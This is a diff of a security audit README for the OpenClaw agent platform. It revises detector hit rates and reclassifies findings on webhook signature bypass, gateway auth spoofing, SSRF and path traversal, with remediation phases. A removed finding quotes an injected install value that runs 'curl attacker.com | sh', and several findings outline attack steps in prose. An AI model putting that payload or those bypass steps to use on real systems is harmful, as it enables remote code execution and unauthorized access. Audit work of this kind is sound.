@@ -1,110 +1,70 @@
-# OpenClaw Security Audit - CADSL Detectors
+# OpenClaw Security Audit - CADSL Detectors (v2)
 
 Automated security detectors for the OpenClaw multi-channel AI agent platform.
 These detectors target TypeScript-specific attack surfaces: WebSocket/HTTP gateways,
 channel webhook integrations, shell execution, auth/credential management, and
 external content processing.
 
+**Audit re-run:** 2026-02-10 | **RETER version:** 0.1.0 | **Session:** 2FC7
+
 ## Detection Patterns
 
 | # | Detector | CWE | Severity | Target | Findings | TP Rate |
 |---|----------|-----|----------|--------|----------|---------|
-| 1 | `complex_gateway_handlers` | CWE-20 | Critical | Gateway server functions handling WebSocket/HTTP input | 22 | 45% |
-| 2 | `webhook_verification_bypass` | CWE-347 | Critical | Webhook signature verification with bypass risk | 7 | 100% |
+| 1 | `complex_gateway_handlers` | CWE-20 | Critical | Gateway server functions handling WebSocket/HTTP input | 22 | 9% |
+| 2 | `webhook_verification_bypass` | CWE-347 | Critical | Webhook signature verification with bypass risk | 7 | 86% |
 | 3 | `command_injection_surface` | CWE-78 | High | Shell execution and process spawning functions | 7 | 29% |
-| 4 | `complex_input_parsers` | CWE-502/CWE-20 | High | Complex parsing/deserialization of external input | 50 | 10% |
+| 4 | `complex_input_parsers` | CWE-502/CWE-20 | High | Complex parsing/deserialization of external input | 50 | 4% |
 | 5 | `auth_handler_complexity` | CWE-287 | High | Complex auth/credential handling functions | 50 | 6% |
 | 6 | `secret_in_logging` | CWE-532 | Medium | Secret redaction/masking in logging code | 7 | 0% |
-| 7 | `external_content_handlers` | CWE-79/CWE-94 | Medium | External content processing (prompt injection, XSS) | 50 | 6% |
-| 8 | `path_traversal_surface` | CWE-22 | Medium | File path resolution from external input | 8 | 13% |
+| 7 | `external_content_handlers` | CWE-79/CWE-94 | Medium | External content processing (prompt injection, XSS) | 50 | 4% |
+| 8 | `path_traversal_surface` | CWE-22 | Medium | File path resolution from external input | 8 | 25% |
 
-**Total: 201 findings, 21 TP, 10 PARTIAL-TP, 170 FP (15% overall TP rate)**
+**Total: 201 findings, 10 TP, 7 PARTIAL-TP, 184 FP (8% overall TP rate)**
 
-## Execution Instructions
+### Changes from v1 Audit
 
-### Run All Detectors
+| Metric | v1 | v2 | Delta |
+|--------|----|----|-------|
+| Total findings | 201 | 201 | = |
+| True Positives | 21 TP + PARTIAL | 10 TP + 7 PARTIAL | -4 net |
+| New findings | — | 4 | +4 |
+| Downgraded to FP | — | 4 | -4 |
+| Upgraded severity | — | 3 | +3 |
 
-Execute each `.cadsl` file via the RETER MCP server:
+**New findings (v2):** `validateTwilioSignature`, `validatePlivoV2Signature`, `validatePlivoV3Signature`, `resolvePath` (backend-config)
 
-```
-mcp__reter__execute_cadsl(script="<path>/complex_gateway_handlers.cadsl")
-mcp__reter__execute_cadsl(script="<path>/webhook_verification_bypass.cadsl")
-mcp__reter__execute_cadsl(script="<path>/command_injection_surface.cadsl")
-mcp__reter__execute_cadsl(script="<path>/complex_input_parsers.cadsl")
-mcp__reter__execute_cadsl(script="<path>/auth_handler_complexity.cadsl")
-mcp__reter__execute_cadsl(script="<path>/secret_in_logging.cadsl")
-mcp__reter__execute_cadsl(script="<path>/external_content_handlers.cadsl")
-mcp__reter__execute_cadsl(script="<path>/path_traversal_surface.cadsl")
-```
-
-Where `<path>` = `d:\ROOT\reter_root\reter_code\src\reter_code\cadsl\tools\security\`
-
-### Custom Parameters
-
-Each detector accepts tunable parameters:
-
-| Parameter | Default | Description |
-|-----------|---------|-------------|
-| `min_lines` | varies (5-30) | Minimum function line count to report |
-| `limit` | 50 | Maximum findings to return |
-
-Lower `min_lines` for broader coverage; raise it to focus on the most complex functions.
+**Downgraded to FP:** `parseMessageWithAttachments` (FP-STRUCTURAL: well-defended), `routeReply` (FP-INTERFACE: safe wrapper), `resolveFilePath` downgraded to low, `authorizeGatewayConnect` downgraded from TP-EXTRACT to PARTIAL-TP
 
 ## Classified Findings
 
-### All Verified True Positives (RETER TASK-001 through TASK-020)
+### All Verified True Positives (RETER 2FC7-TASK-001 through 017)
 
 | RETER ID | Function | File:Line | CWE | Classification | Priority |
 |----------|----------|-----------|-----|---------------|----------|
-| TASK-001 | `reconstructWebhookUrl` | `extensions/voice-call/src/webhook-security.ts:183` | CWE-347 | **TP-EXTRACT** | Critical |
-| TASK-002 | `verifyTwilioWebhook` | `extensions/voice-call/src/webhook-security.ts:336` | CWE-347 | **TP-PARAMETERIZE** | Critical |
-| TASK-003 | `verifyPlivoWebhook` | `extensions/voice-call/src/webhook-security.ts:578` | CWE-347 | **TP-PARAMETERIZE** | Critical |
-| TASK-004 | `attachGatewayWsMessageHandler` | `src/gateway/server/ws-connection/message-handler.ts:133` | CWE-287 | **TP-PARAMETERIZE** | Critical |
-| TASK-005 | `authorizeGatewayMethod` | `src/gateway/server-methods.ts:93` | CWE-287 | **PARTIAL-TP** | High |
-| TASK-011 | `splitShellArgs` | `src/utils/shell-argv.ts:1` | CWE-78 | **TP-EXTRACT** | High |
-| TASK-012 | `spawnSignalDaemon` | `src/signal/daemon.ts:62` | CWE-78 | **TP-PARAMETERIZE** | High |
-| TASK-013 | `parseInstallSpec` | `src/agents/skills/frontmatter.ts:34` | CWE-502 | **TP-PARAMETERIZE** | High |
-| TASK-014 | `parseMessageWithAttachments` | `src/gateway/chat-attachments.ts:62` | CWE-20 | **TP-EXTRACT** | High |
-| TASK-016 | `authorizeGatewayConnect` | `src/gateway/auth.ts:238` | CWE-287 | **TP-EXTRACT** | High |
-| TASK-018 | `fetchRemoteMedia` | `src/media/fetch.ts:80` | CWE-918 | **TP-PARAMETERIZE** | High |
-| TASK-015 | `parseConfigCommand` | `src/auto-reply/reply/config-commands.ts:9` | CWE-22 | **PARTIAL-TP** | Medium |
-| TASK-017 | `fetchWithAuthFallback` | `extensions/msteams/src/attachments/download.ts:85` | CWE-287 | **PARTIAL-TP** | Medium |
-| TASK-019 | `routeReply` | `src/auto-reply/reply/route-reply.ts:57` | CWE-79 | **PARTIAL-TP** | Medium |
-| TASK-020 | `resolveFilePath` | `src/canvas-host/server.ts:158` | CWE-22 | **PARTIAL-TP** | Medium |
-
-### Remediation Tasks Created
-
-| RETER ID | Remediation | Derived From | Priority |
-|----------|-------------|-------------|----------|
-| TASK-006 | Enforce allowedHosts or reject forwarding headers by default in `reconstructWebhookUrl` | TASK-001 | Critical |
-| TASK-007 | Add NODE_ENV production guard to `skipVerification` and ngrok loopback bypass | TASK-002 | Critical |
-| TASK-008 | Add production guard to Plivo `skipVerification` and audit URL construction chain | TASK-003 | Critical |
-| TASK-009 | Prevent `client.id` spoofing from bypassing device auth requirements | TASK-004 | Critical |
-| TASK-010 | Refactor `authorizeGatewayMethod` to table-driven RBAC | TASK-005 | High |
-| TASK-021 | Validate URLs, paths, and package names in `parseInstallSpec` | TASK-013 | High |
+| TASK-001 | `verifyTwilioWebhook` | `extensions/voice-call/src/webhook-security.ts:336` | CWE-347 | **TP-PARAMETERIZE** | Critical |
+| TASK-002 | `verifyPlivoWebhook` | `extensions/voice-call/src/webhook-security.ts:578` | CWE-347 | **TP-PARAMETERIZE** | Critical |
+| TASK-003 | `attachGatewayWsMessageHandler` | `src/gateway/server/ws-connection/message-handler.ts:133` | CWE-287 | **TP-PARAMETERIZE** | Critical |
+| TASK-004 | `fetchRemoteMedia` | `src/media/fetch.ts:80` | CWE-918 | **TP-EXTRACT** | Critical |
+| TASK-005 | `reconstructWebhookUrl` | `extensions/voice-call/src/webhook-security.ts:183` | CWE-347 | **TP-EXTRACT** | High |
+| TASK-006 | `authorizeGatewayMethod` | `src/gateway/server-methods.ts:93` | CWE-287 | **TP-PARAMETERIZE** | High |
+| TASK-007 | `validateTwilioSignature` | `extensions/voice-call/src/webhook-security.ts:12` | CWE-347 | **TP-PARAMETERIZE** | High (NEW) |
+| TASK-008 | `validatePlivoV2Signature` | `extensions/voice-call/src/webhook-security.ts:458` | CWE-347 | **TP-PARAMETERIZE** | High (NEW) |
+| TASK-009 | `fetchWithAuthFallback` | `extensions/msteams/src/attachments/download.ts:85` | CWE-287 | **TP-EXTRACT** | High |
+| TASK-010 | `parseInstallSpec` | `src/agents/skills/frontmatter.ts:34` | CWE-502 | **TP-PARAMETERIZE** | Medium |
+| TASK-011 | `spawnSignalDaemon` | `src/signal/daemon.ts:62` | CWE-78 | **TP-PARAMETERIZE** | Medium |
+| TASK-012 | `validatePlivoV3Signature` | `extensions/voice-call/src/webhook-security.ts:538` | CWE-347 | **PARTIAL-TP** | Medium (NEW) |
+| TASK-013 | `resolvePath` | `src/memory/backend-config.ts:101` | CWE-22 | **PARTIAL-TP** | Medium (NEW) |
+| TASK-014 | `authorizeGatewayConnect` | `src/gateway/auth.ts:238` | CWE-287 | **PARTIAL-TP** | Medium |
+| TASK-015 | `splitShellArgs` | `src/utils/shell-argv.ts:1` | CWE-78 | **PARTIAL-TP** | Low |
+| TASK-016 | `parseConfigCommand` | `src/auto-reply/reply/config-commands.ts:9` | CWE-22 | **PARTIAL-TP** | Low |
+| TASK-017 | `resolveFilePath` | `src/canvas-host/server.ts:158` | CWE-22 | **PARTIAL-TP** | Low |
 
 ## Detailed Finding Analysis
 
 ### Tier 1: Critical
 
-#### TASK-001: `reconstructWebhookUrl` — Header Injection (TP-EXTRACT)
-
-**File:** `extensions/voice-call/src/webhook-security.ts:183` (90 lines)
-
-Reconstructs the webhook callback URL from HTTP headers for HMAC signature
-verification. When `trustForwardingHeaders` is true, attacker-controlled
-`X-Forwarded-Host` / `X-Original-Host` / `ngrok-forwarded-host` headers
-override the URL used for signature computation. An attacker with their own
-Twilio/Plivo account computes a valid HMAC against `attacker.com`, sends the
-request with injected forwarding headers, and the signature validates against
-the wrong URL. The `allowedHosts` whitelist mitigates this but is optional
-and not enforced by default. Falls back to raw `Host` header (line 234-241)
-without validation.
-
-**Attack:** Remote, no auth required. Precondition: `trustForwardingHeaders: true`
-without strict `allowedHosts`.
-
-#### TASK-002: `verifyTwilioWebhook` — Bypass Paths (TP-PARAMETERIZE)
+#### TASK-001: `verifyTwilioWebhook` — Bypass Paths (TP-PARAMETERIZE)
 
 **File:** `extensions/voice-call/src/webhook-security.ts:336` (87 lines)
 
@@ -115,205 +75,238 @@ Two bypass paths:
    signature validation **fails**, if the URL contains `.ngrok-free.app` and the
    request comes from loopback. Exploitable via SSRF or any process on localhost.
 
-**Root cause dependency:** Uses `reconstructWebhookUrl` (TASK-001) for URL
+**Root cause dependency:** Uses `reconstructWebhookUrl` (TASK-005) for URL
 construction, inheriting the header injection vulnerability.
 
-#### TASK-003: `verifyPlivoWebhook` — skipVerification Bypass (TP-PARAMETERIZE)
+**Attack:** Remote, no auth required. Precondition: `skipVerification: true` in config
+or SSRF-to-loopback for ngrok bypass.
+
+#### TASK-002: `verifyPlivoWebhook` — skipVerification + Downgrade (TP-PARAMETERIZE)
 
 **File:** `extensions/voice-call/src/webhook-security.ts:578` (112 lines)
 
-Same `skipVerification` bypass as Twilio (line 608). Multi-scheme fallback
-(V3 then V2) is correctly implemented with `timingSafeEqualString` for HMAC
-comparison. However, both schemes use the URL from `reconstructWebhookUrl`
-(TASK-001), so header injection defeats both V3 and V2 verification.
+Same `skipVerification` bypass (line 608). V3→V2 fallback creates theoretical
+downgrade risk. Both V3 and V2 schemes use `reconstructWebhookUrl` (TASK-005),
+so header injection defeats both. `timingSafeEqualString` correctly used for
+HMAC comparison.
 
-#### TASK-004: `attachGatewayWsMessageHandler` — Device Auth Bypass (TP-PARAMETERIZE)
+#### TASK-003: `attachGatewayWsMessageHandler` — Device Auth Bypass (TP-PARAMETERIZE)
 
 **File:** `src/gateway/server/ws-connection/message-handler.ts:133` (876 actual lines)
 
-Central WebSocket handler. Config flags `dangerouslyDisableDeviceAuth` and
-`allowInsecureAuth` disable device identity verification for clients with
-`client.id === "control-ui"`. Since `client.id` is **self-reported** by the
-connecting client, any attacker who knows the gateway token/password can
-claim to be `control-ui` and skip device pairing entirely. Also has a legacy
-v1 signature fallback (lines 597-625) that accepts signatures without nonce
-on loopback connections.
+Config flags `dangerouslyDisableDeviceAuth` and `allowInsecureAuth` disable device
+identity verification. `client.id` is **self-reported** — attacker claims `"control-ui"`
+to skip device pairing entirely. Legacy v1 signature fallback (lines 597-625)
+accepted on loopback connections without nonce or replay protection.
 
-### Tier 2: High
+**Attack:** Requires gateway token/password. Attacker connects WebSocket claiming
+`client.id = "control-ui"`, gains full platform access without device pairing.
 
-#### TASK-005: `authorizeGatewayMethod` — Fragile RBAC (PARTIAL-TP)
-
-**File:** `src/gateway/server-methods.ts:93` (68 lines)
-
-RBAC with duplicated check-then-allow pattern across 5 method categories.
-Default at line 159 is deny (safe — not currently exploitable). The pattern
-requires each method to appear in both a scope-check block AND a return-null
-block. A developer adding a method to `WRITE_METHODS` but forgetting the
-`return null` creates a denial; adding the `return null` without the scope
-check creates an auth bypass. Hardcoded string prefixes at lines 141-155
-are especially brittle.
-
-**Risk:** Regression on future changes, not currently exploitable.
-
-#### TASK-011: `splitShellArgs` — Shell Tokenizer (TP-EXTRACT)
-
-**File:** `src/utils/shell-argv.ts:1` (62 lines)
-
-Hand-written shell argument tokenizer handling single/double quotes and backslash
-escapes. Returns `null` on unclosed quotes (good safety). If upstream callers
-pass user-controlled text, this parser determines how shell arguments are
-split — a malformed input could produce unexpected token boundaries. Callers
-must ensure user input doesn't reach this function unsanitized.
-
-#### TASK-012: `spawnSignalDaemon` — Unsanitized Account (TP-PARAMETERIZE)
-
-**File:** `src/signal/daemon.ts:62` (31 lines)
-
-User-provided `account` string flows directly to `args.push("-a", opts.account)`
-without validation. Currently safe because `spawn()` uses array form (no shell).
-However, no alphanumeric check or length limit exists. Vulnerable if refactored
-to shell execution or if `signal-cli` interprets the account value unsafely.
-
-#### TASK-013: `parseInstallSpec` — Unvalidated Package Names (TP-PARAMETERIZE)
-
-**File:** `src/agents/skills/frontmatter.ts:34` (57 lines)
-
-Parses YAML frontmatter from user-provided skill metadata. `kind` is validated
-against a whitelist (brew, node, go, uv, download) but values within each kind
-(formula, package, module, url, archive, targetDir) are accepted without format
-validation or length limits. A malicious skill YAML could specify
-`formula: "legit-package; curl attacker.com | sh"` if Homebrew's install path
-passes it through a shell.
-
-#### TASK-014: `parseMessageWithAttachments` — Base64 Parsing (TP-EXTRACT)
-
-**File:** `src/gateway/chat-attachments.ts:62` (70 lines)
-
-Parses base64-encoded attachments from external channel messages. Implements
-comprehensive validation: base64 charset check, length must be multiple of 4,
-decoded size checked against configurable `maxBytes` (default 5MB), MIME type
-sniffed from binary. This is a **well-defended** trust boundary — the
-validation is exemplary — but processes untrusted data directly and remains
-a critical attack surface worth periodic re-audit.
-
-#### TASK-016: `authorizeGatewayConnect` — Tailscale Priority (TP-EXTRACT)
-
-**File:** `src/gateway/auth.ts:238` (54 lines)
-
-Core gateway authorization. Uses `safeEqual()` (timing-safe) for token/password
-comparison. Tailscale auth check runs BEFORE token/password checks. If
-`auth.allowTailscale=true`, the function attempts `resolveVerifiedTailscaleUser()`
-which validates via whois lookup requiring both headers AND proxy verification.
-Implementation is sound, but the priority ordering means a Tailscale
-misconfiguration could bypass token/password auth entirely.
-
-#### TASK-018: `fetchRemoteMedia` — SSRF Surface (TP-PARAMETERIZE)
+#### TASK-004: `fetchRemoteMedia` — SSRF via DNS Rebinding (TP-EXTRACT)
 
 **File:** `src/media/fetch.ts:80` (92 lines)
 
-Fetches external URLs from channel messages. Multiple validation layers:
-`fetchWithSsrFGuard()` (blocks private networks), Content-Length vs maxBytes,
-filename via `path.basename()`, MIME sniffing. The SSRF guard is the critical
-control — if bypassed via DNS rebinding or TOCTOU, attacker reaches internal
-services. Error body snippet truncated to 200 chars.
+**Upgraded from High to Critical in v2.** Fetches external URLs from channel messages.
+`fetchWithSsrFGuard()` blocks private IP ranges, Content-Length checked against
+maxBytes, MIME sniffed from binary. The SSRF guard is the critical control — vulnerable
+to DNS rebinding (first resolve→public IP passes guard, second resolve→169.254.169.254
+reaches cloud metadata). Error body truncated to 200 chars limits data exfiltration
+but doesn't eliminate it.
 
-### Tier 3: Medium
+**Attack:** Remote, via channel message. Send media URL pointing to DNS rebinding
+service → access cloud metadata or internal services.
 
-#### TASK-015: `parseConfigCommand` — Config Path (PARTIAL-TP)
+### Tier 2: High
 
-**File:** `src/auto-reply/reply/config-commands.ts:9` (63 lines)
+#### TASK-005: `reconstructWebhookUrl` — Header Injection (TP-EXTRACT)
 
-Action validated against whitelist (`show|get|unset|set`). Value type-checked.
-Config path accepted as-is without traversal protection. Downstream config
-system must validate. If config path maps to filesystem or sensitive keys,
-exploitable.
+**File:** `extensions/voice-call/src/webhook-security.ts:183` (90 lines)
 
-#### TASK-017: `fetchWithAuthFallback` — Unauth-First (PARTIAL-TP)
+**Downgraded from Critical to High in v2.** Root cause for TASK-001 and TASK-002.
+When `trustForwardingHeaders: true`, attacker-controlled `X-Forwarded-Host` /
+`X-Original-Host` / `ngrok-forwarded-host` headers override the URL used for
+HMAC computation. Has RFC 1123 hostname validation and optional `allowedHosts`
+whitelist, but `allowedHosts` is not enforced by default. Silent fallback to
+empty host string if all header sources fail.
+
+#### TASK-006: `authorizeGatewayMethod` — Fragile RBAC (TP-PARAMETERIZE)
+
+**File:** `src/gateway/server-methods.ts:93` (68 lines)
+
+**Upgraded from PARTIAL-TP to TP-PARAMETERIZE in v2.** Hardcoded `startsWith()`
+checks on 5 method categories for scope-to-permission mapping. Default deny at
+catch-all (line 159) is safe. But adding new methods requires dual update: scope
+check + return null for method resolution. Missing either creates auth bypass
+(return null without scope check) or denial (scope check without return null).
+
+#### TASK-007: `validateTwilioSignature` — Unvalidated Format (TP-PARAMETERIZE) [NEW]
+
+**File:** `extensions/voice-call/src/webhook-security.ts:12` (31 lines)
+
+**New finding in v2.** Accepts signature without validating base64 format before
+HMAC comparison. Caller responsible for correct URL and parameter ordering.
+No format guard before crypto comparison. Low-level primitive with inadequate
+input validation at the API boundary.
+
+#### TASK-008: `validatePlivoV2Signature` — Unvalidated Nonce (TP-PARAMETERIZE) [NEW]
+
+**File:** `extensions/voice-call/src/webhook-security.ts:458` (15 lines)
+
+**New finding in v2.** No nonce validation before HMAC computation. Empty or
+specially crafted nonce could be exploited. No base64 format validation on
+input signature. Normalizes base64 signatures without checking well-formedness.
+
+#### TASK-009: `fetchWithAuthFallback` — Credential Leakage (TP-EXTRACT)
 
 **File:** `extensions/msteams/src/attachments/download.ts:85` (59 lines)
 
-Downloads Teams attachments. First fetch is unauthenticated, retried with auth
-token on 401/403. URL allowlist enforced (HTTPS only, hostname whitelist).
-Redirect chain only validates first redirect. Unauthenticated-first approach
-leaks timing information about protected resources.
+**Upgraded from PARTIAL-TP to TP-EXTRACT in v2.** Downloads Teams attachments
+unauthenticated-first, retries with auth on 401/403. URL allowlist enforced
+(HTTPS only, hostname whitelist). Redirect chain only validates first redirect —
+subsequent redirects could escape hostname allowlist and leak auth token to
+attacker-controlled host. Unauthenticated-first approach also leaks timing
+information about protected resources.
 
-#### TASK-019: `routeReply` — Content Sanitization (PARTIAL-TP)
+### Tier 3: Medium
 
-**File:** `src/auto-reply/reply/route-reply.ts:57` (91 lines)
+#### TASK-010: `parseInstallSpec` — Unvalidated Package Names (TP-PARAMETERIZE)
 
-Key content sanitization boundary for all outbound messages. Applies
-`sanitizeUserFacingText()` on text content. Channel/thread IDs validated.
-`sanitizeUserFacingText()` focuses on error patterns but returns unmodified
-text if no errors detected — relies on recipient channel safety for HTML/XSS.
-Worth verifying coverage of prompt injection markers.
+**File:** `src/agents/skills/frontmatter.ts:34` (57 lines)
 
-#### TASK-020: `resolveFilePath` — Canvas Path Traversal (PARTIAL-TP)
+Kind field whitelisted (brew/node/go/uv/download) but values within each kind
+(formula, package, url, targetDir) accepted without format validation or length
+limits. Malicious YAML could specify shell metacharacters in formula or arbitrary
+URLs in download kind.
+
+#### TASK-011: `spawnSignalDaemon` — Unsanitized Account (TP-PARAMETERIZE)
+
+**File:** `src/signal/daemon.ts:62` (31 lines)
+
+Account param flows to `spawn()` args without alphanumeric validation. Array-form
+spawn prevents shell injection, but no format check or length limit. Vulnerable
+if signal-cli interprets account value unsafely or if refactored to shell execution.
+
+#### TASK-012: `validatePlivoV3Signature` — Multi-Signature Acceptance (PARTIAL-TP) [NEW]
+
+**File:** `extensions/voice-call/src/webhook-security.ts:538` (32 lines)
+
+**New finding in v2.** Accepts comma-separated signatures in header, returns true
+if ANY match. Timing-safe comparison on individual signatures is correct, but
+multi-signature acceptance means attacker only needs to forge one valid signature.
+
+#### TASK-013: `resolvePath` — Arbitrary Path Resolution (PARTIAL-TP) [NEW]
+
+**File:** `src/memory/backend-config.ts:101` (10 lines)
+
+**New finding in v2.** Resolves user-supplied config paths with `path.normalize()`
+but no bounds check ensuring path stays within expected workspace. Could resolve
+to arbitrary filesystem locations if config source is malicious.
+
+#### TASK-014: `authorizeGatewayConnect` — Tailscale Priority (PARTIAL-TP)
+
+**File:** `src/gateway/auth.ts:238` (54 lines)
+
+**Downgraded from TP-EXTRACT to PARTIAL-TP in v2.** Proper `timingSafeEqual()` for
+token/password comparison. Tailscale auth runs before token/password but is well-gated
+with verified whois lookup requiring both headers AND proxy verification. Risk is
+config-level: if `allowTailscale=true` and Tailscale is misconfigured, token/password
+auth is never evaluated.
+
+### Tier 4: Low
+
+#### TASK-015: `splitShellArgs` — Trust-Sensitive Tokenizer (PARTIAL-TP)
+
+**File:** `src/utils/shell-argv.ts:1` (62 lines)
+
+Hand-written tokenizer returning parsed array. Returns null on unclosed quotes (safe).
+But if user-controlled text reaches this function, token boundaries determine what
+gets executed downstream. Caller-dependent risk.
+
+#### TASK-016: `parseConfigCommand` — Config Path (PARTIAL-TP)
+
+**File:** `src/auto-reply/reply/config-commands.ts:9` (63 lines)
+
+Action validated against whitelist (`show|get|unset|set`). Config path accepted
+as-is without traversal protection. Downstream config system must validate.
+
+#### TASK-017: `resolveFilePath` — Canvas Path Traversal (PARTIAL-TP)
 
 **File:** `src/canvas-host/server.ts:158` (37 lines)
 
-Explicit `..` traversal check, symlink rejection via `lstat`, and
-`openFileWithinRoot()` with `SafeOpenError` for jail enforcement. Potential
-TOCTOU race between lstat (line 182) and subsequent open. The
-`openFileWithinRoot` is the real guard — inline checks are defense-in-depth.
+**Downgraded from Medium to Low in v2.** Explicit `..` check + symlink rejection
+via `lstat` + `openFileWithinRoot()` jail with `SafeOpenError`. Theoretical TOCTOU
+race between lstat and open. `openFileWithinRoot` is the real guard — inline checks
+are defense-in-depth.
 
-### False Positive Summary by Detector
+### Notable Downgrades to FP (v2)
+
+| Function | v1 Classification | v2 Classification | Reason |
+|----------|-------------------|-------------------|--------|
+| `parseMessageWithAttachments` | TP-EXTRACT High | **FP-STRUCTURAL** | Comprehensive validation: base64 charset check, length validation, size limits, MIME sniffing. Well-defended trust boundary. |
+| `routeReply` | PARTIAL-TP Medium | **FP-INTERFACE** | Safe wrapper delegating to `deliverOutboundPayloads`. No direct trust boundary handling. |
+
+## False Positive Summary by Detector
 
 #### `secret_in_logging` — 0/7 TP (all FP-INTERFACE)
 
-All 7 findings (`redactText`, `maskToken`, `redactPemBlock`, `redactIdentifier`,
-`redactRawText`, `redactConfigSnapshot`, `redactMatch`) ARE the
-redaction/masking layer — these functions are mitigations, not vulnerabilities.
-The detector correctly identified security-relevant code but the functions
-themselves are safe.
+All 7 findings are the redaction/masking layer itself — mitigations, not vulnerabilities.
 
 #### `command_injection_surface` — 5/7 FP
 
-- `spawnGogServe` → **FP-STRUCTURAL**: Config-driven, array-form `spawn()`.
-- `executePluginCommand` → **FP-INTERFACE**: Callback interface, no shell.
-- `execDocker` → **FP-INTERFACE**: Array-form `spawn()`, validated upstream.
-- `runCommand` → **FP-LAYERS**: Script utility, not production code path.
-- `execText` → **FP-INTERFACE**: Browser executable detection utility.
-
-Key insight: All command_injection findings use `spawn()` with array arguments,
-which bypasses shell entirely. No actual shell injection exists.
+All `spawn()` calls use array-form arguments (shell-free). Only `splitShellArgs`
+(trust-sensitive tokenizer, PARTIAL-TP) and `spawnSignalDaemon` (unsanitized account,
+TP-PARAMETERIZE) flagged.
 
 #### `auth_handler_complexity` — 47/50 FP
 
-The majority are:
-- `applyAuthChoice*` functions → **FP-TRIVIAL**: Config setup, not auth enforcement.
-- `buildAuthHealthSummary` → **FP-STRUCTURAL**: Purely diagnostic/informational.
-- `refreshOAuthTokenWithLock` → **FP-INTERFACE**: Correct expiration + type checks.
-- `summarizeTokenConfig` → **FP-INTERFACE**: Display-only, reads status.
-- `resolveModelAuth*` → **FP-LAYERS**: Internal resolution, no auth decisions.
-- `maybeRemoveDeprecatedCliAuthProfiles` → **FP-STRUCTURAL**: Migration cleanup.
-- `repairOAuthProfileIdMismatch` → **FP-STRUCTURAL**: Data repair utility.
+Majority are `applyAuthChoice*` (config setup), `buildAuthHealthSummary` (diagnostic),
+`refreshOAuthTokenWithLock` (correct expiration checks), `resolveModelAuth*` (internal
+resolution). Only `authorizeGatewayMethod`, `fetchWithAuthFallback`, and
+`authorizeGatewayConnect` flagged.
 
-#### `complex_input_parsers` — 45/50 FP
+#### `complex_input_parsers` — 48/50 FP
 
-Most parsers either:
-- Process internal/validated data (FP-LAYERS): `parseFenceSpans`, `parseInlineCodeSpans`, `parseCliProfileArgs`
-- Parse structured formats with validation (FP-STRUCTURAL): `parseGeoUri`, `parseVcard`, `parseSystemdUnit`
-- Target parsing with safe fallbacks (FP-INTERFACE): `parseSlackTarget`, `parseDiscordTarget`, `parseIMessageTarget`
+Most parsers process internal/validated data or use safe fallbacks. Only
+`parseInstallSpec` (unvalidated YAML values) and `parseConfigCommand`
+(unprotected config path) flagged.
 
-#### `external_content_handlers` — 47/50 FP
+#### `external_content_handlers` — 48/50 FP
 
-Most are internal reply-pipeline functions:
-- `createTypingSignaler` → **FP-STRUCTURAL**: Internal typing indicator state machine.
-- `handleCommands` → **FP-INTERFACE**: Auth gates present, delegates to handlers.
-- `isApprovedElevatedSender` → **FP-INTERFACE**: Normalization + allowlist comparison.
-- `resolveElevatedPermissions` → **FP-LAYERS**: Delegates validation to lower layers.
-- Onboarding prompts (`promptSignalAllowFrom`, `promptIMessageAllowFrom`) → **FP-TRIVIAL**: Display-only.
-- Status collectors (`collectTelegramStatusIssues`) → **FP-STRUCTURAL**: Read-only diagnostics.
+Most are internal reply-pipeline functions. Only `fetchRemoteMedia` (SSRF surface)
+and `parseConfigCommand` (via dual-detection) flagged.
 
-#### `path_traversal_surface` — 7/8 FP
+#### `path_traversal_surface` — 6/8 FP
 
-- `listAgentFiles` → **FP-STRUCTURAL**: Uses constant `BOOTSTRAP_FILE_NAMES`, no user-controlled paths.
-- `resolveFilenameFromSource` → **FP-LAYERS**: `path.basename()` applied, no traversal.
-- `normalizePathPrepend` → **FP-INTERFACE**: PATH env normalization, no user input.
-- `resolveFileLimits` → **FP-LAYERS**: Internal media limit resolution.
-- `normalizePath` → **FP-TRIVIAL**: UI-only navigation helper.
-- `normalizePathCandidate` → **FP-INTERFACE**: Internal `is-main` detection.
-- `resolvePath` → **FP-LAYERS**: Config backend path resolution from validated config.
+`listAgentFiles` uses constant ALLOWED_FILE_NAMES. `resolveFilenameFromSource` applies
+`path.basename()`. Only `resolvePath` (arbitrary resolution) and `resolveFilePath`
+(TOCTOU) flagged.
+
+## Triage Workflow
+
+### Phase 1: Critical Webhook + SSRF (TASK-001, 002, 004, 005)
+1. **TASK-005**: Enforce `allowedHosts` by default in `reconstructWebhookUrl`
+2. **TASK-001/002**: Add `NODE_ENV === "production"` guard to `skipVerification`
+3. **TASK-001**: Remove or restrict ngrok loopback bypass
+4. **TASK-004**: Audit `fetchWithSsrFGuard()` for DNS rebinding resistance
+5. **TASK-007/008**: Add base64 format and nonce validation to low-level HMAC functions
+
+### Phase 2: Critical Gateway Auth (TASK-003, 006)
+1. **TASK-003**: Prevent `client.id` spoofing — device auth bypass must not rely on self-reported identity
+2. **TASK-003**: Remove or deprecate legacy v1 signature fallback
+3. **TASK-006**: Refactor `authorizeGatewayMethod` to table-driven RBAC
+
+### Phase 3: High + Medium (TASK-009 through 014)
+1. **TASK-009**: Validate full redirect chain in `fetchWithAuthFallback`
+2. **TASK-010**: Validate URLs, paths, and package names in `parseInstallSpec`
+3. **TASK-011**: Add alphanumeric validation to Signal daemon account parameter
+4. **TASK-012**: Restrict `validatePlivoV3Signature` to single signature acceptance
+5. **TASK-013**: Add bounds checking to `resolvePath` in backend-config
+6. **TASK-014**: Document Tailscale auth priority ordering risk
+
+### Phase 4: Low Priority (TASK-015, 016, 017)
+1. **TASK-015**: Audit callers of `splitShellArgs` for user input exposure
+2. **TASK-016**: Verify downstream config system validates paths
+3. **TASK-017**: Verify `openFileWithinRoot` eliminates TOCTOU race
 
 ## Classification Criteria
 
@@ -321,50 +314,25 @@ Most are internal reply-pipeline functions:
 
 | Classification | Description | Example |
 |---------------|-------------|---------|
-| **TP-EXTRACT** | Function processes untrusted input at a trust boundary | `reconstructWebhookUrl` rebuilds URLs from attacker-controlled headers |
+| **TP-EXTRACT** | Function processes untrusted input at a trust boundary | `fetchRemoteMedia` fetches URLs from channel messages via SSRF-guarded fetch |
 | **TP-PARAMETERIZE** | Function has bypass/skip parameters that weaken security | `verifyTwilioWebhook` with `skipVerification` and ngrok loopback bypass |
-| **PARTIAL-TP** | Function has mitigations but incomplete coverage or edge cases | `resolveFilePath` has `..` check but potential TOCTOU race |
+| **PARTIAL-TP** | Function has mitigations but incomplete coverage or edge cases | `authorizeGatewayConnect` has timing-safe comparison but Tailscale priority ordering risk |
 
 ### False Positive (FP) Categories
 
 | Classification | Description | Example |
 |---------------|-------------|---------|
